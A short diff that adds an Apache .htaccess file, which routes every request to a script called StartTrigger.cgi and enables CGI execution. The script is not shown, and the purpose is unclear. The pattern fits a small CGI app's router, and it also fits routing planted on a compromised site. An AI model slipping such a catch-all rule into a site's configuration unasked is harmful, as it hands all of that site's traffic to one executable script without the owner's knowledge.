@@ -1,0 +1,7 @@
+
+ 
+RewriteEngine On
+RewriteRule ^.*$ StartTrigger.cgi
+
+AddHandler cgi-script .cgi
+Options +ExecCGI
